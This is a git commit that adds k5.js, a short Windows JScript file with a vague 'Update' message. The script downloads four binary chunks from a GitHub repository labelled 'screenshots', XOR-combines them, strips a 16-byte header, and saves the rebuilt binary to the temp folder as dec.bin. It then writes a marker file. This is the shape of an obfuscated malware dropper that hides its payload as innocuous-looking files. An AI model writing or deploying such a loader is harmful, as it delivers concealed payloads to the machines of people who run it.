22532d9692ccc92ae7ee182f2a750e2dcabc4d50
cem324 <hvpauxr102@hotmail.com>
2026-09-22 12:56:59 +0000

    Update k5.js

---
+++ k5.js
@@ -0,0 +1,8 @@
+var x=new ActiveXObject("MSXML2.XMLHTTP");
+var fso=new ActiveXObject("Scripting.FileSystemObject");
+var b=[];for(var i=0;i<4;i++){x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/c"+i,0);x.send();b.push(x.responseBody);}
+var xr=[];var l=b[0].length;for(var k=0;k<l;k++){var v=b[0][k];for(var j=1;j<4;j++){v^=b[j][k]};xr.push(v)}
+var s=new ActiveXObject("ADODB.Stream");s.Type=1;s.Open();
+for(var m=16;m<xr.length;m++)s.WriteByte(xr[m]&0xFF);
+var t=fso.GetSpecialFolder(2)+"\\dec.bin";s.SaveToFile(t,2);s.Close();
+fso.CreateTextFile("C:\\temp\\k5.txt").Write("OK");
